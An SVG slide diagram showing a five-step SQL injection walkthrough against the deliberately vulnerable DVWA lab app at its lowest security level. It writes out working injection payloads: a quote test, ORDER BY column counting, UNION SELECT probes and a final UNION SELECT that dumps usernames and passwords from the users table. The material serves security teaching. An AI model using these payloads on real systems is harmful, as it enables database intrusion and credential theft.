<ns0:svg xmlns:ns0="http://www.w3.org/2000/svg" viewBox="0 0 1280 720">
  <defs>

    <!-- Gradients -->
    <linearGradient id="grad-primary" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#1e88e5"/>
      <stop offset="100%" stop-color="#1565c0"/>
    </linearGradient>

    <linearGradient id="grad-surface" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#f5f5f5"/>
    </linearGradient>

    <linearGradient id="grad-ok" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#43a047"/>
      <stop offset="100%" stop-color="#2e7d32"/>
    </linearGradient>

    <linearGradient id="grad-warn" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#fb8c00"/>
      <stop offset="100%" stop-color="#e65100"/>
    </linearGradient>

    <linearGradient id="grad-danger" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#e53935"/>
      <stop offset="100%" stop-color="#c62828"/>
    </linearGradient>

    <linearGradient id="grad-info" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#8e24aa"/>
      <stop offset="100%" stop-color="#6a1b9a"/>
    </linearGradient>

    <!-- Drop shadow -->
    <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
      <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#00000022"/>
    </filter>

    <!-- Arrow markers -->
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#555555"/>
    </marker>
    <marker id="arrow-primary" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#1565c0"/>
    </marker>
    <marker id="arrow-ok" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#2e7d32"/>
    </marker>
    <marker id="arrow-warn" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#e65100"/>
    </marker>
    <marker id="arrow-danger" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#c62828"/>
    </marker>
    <marker id="arrow-info" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#6a1b9a"/>
    </marker>
    <marker id="arrow-white" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
    </marker>
    </defs>
  <ns0:rect width="1137.7778" height="640" fill="#f5f5f5" rx="6.8956" stroke="#333" stroke-width="2.5859" />
  <ns0:text x="568.8889" y="51.2" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="#222" text-anchor="middle">DVWA SQL Injection — Step-by-Step (Security: Low)</ns0:text>
  <ns0:text x="568.8889" y="89.6" font-family="monospace" font-size="18.9629" fill="#555" text-anchor="middle">URL: /vulnerabilities/sqli/?id=1&amp;Submit=Submit</ns0:text>
  <ns0:rect x="34.4781" y="119.4667" width="51.7172" height="64" fill="#1565c0" rx="6.8956" />
  <ns0:text x="60.3367" y="162.1333" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="#fff" text-anchor="middle">1</ns0:text>
  <ns0:text x="103.4343" y="149.3333" font-family="sans-serif" font-size="22.4108" font-weight="bold" fill="#333">Test for injection</ns0:text>
  <ns0:text x="103.4343" y="181.3333" font-family="monospace" font-size="18.9629" fill="#c62828">id=1'  →  Error (injectable!)</ns0:text>
  <ns0:rect x="34.4781" y="213.3333" width="51.7172" height="64" fill="#1565c0" rx="6.8956" />
  <ns0:text x="60.3367" y="256" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="#fff" text-anchor="middle">2</ns0:text>
  <ns0:text x="103.4343" y="243.2" font-family="sans-serif" font-size="22.4108" font-weight="bold" fill="#333">Determine number of columns</ns0:text>
  <ns0:text x="103.4343" y="275.2" font-family="monospace" font-size="18.9629" fill="#555">id=1' ORDER BY 2-- -  →  Works  |  ORDER BY 3  →  Error  (2 columns)</ns0:text>
  <ns0:rect x="34.4781" y="315.7333" width="51.7172" height="64" fill="#1565c0" rx="6.8956" />
  <ns0:text x="60.3367" y="358.4" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="#fff" text-anchor="middle">3</ns0:text>
  <ns0:text x="103.4343" y="345.6" font-family="sans-serif" font-size="22.4108" font-weight="bold" fill="#333">Find display columns</ns0:text>
  <ns0:text x="103.4343" y="377.6" font-family="monospace" font-size="18.9629" fill="#555">id=' UNION SELECT 1,2-- -  →  Shows "1" and "2" on page</ns0:text>
  <ns0:rect x="34.4781" y="418.1333" width="51.7172" height="64" fill="#1565c0" rx="6.8956" />
  <ns0:text x="60.3367" y="460.8" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="#fff" text-anchor="middle">4</ns0:text>
  <ns0:text x="103.4343" y="448" font-family="sans-serif" font-size="22.4108" font-weight="bold" fill="#333">Extract DB version</ns0:text>
  <ns0:text x="103.4343" y="480" font-family="monospace" font-size="18.9629" fill="#555">id=' UNION SELECT 1,@@version-- -</ns0:text>
  <ns0:rect x="34.4781" y="520.5333" width="51.7172" height="64" fill="#c62828" rx="6.8956" />
  <ns0:text x="60.3367" y="563.2" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="#fff" text-anchor="middle">5</ns0:text>
  <ns0:text x="103.4343" y="550.4" font-family="sans-serif" font-size="22.4108" font-weight="bold" fill="#c62828">Dump user credentials</ns0:text>
  <ns0:text x="103.4343" y="582.4" font-family="monospace" font-size="18.9629" fill="#c62828">id=' UNION SELECT user,password FROM users-- -</ns0:text>
</ns0:svg>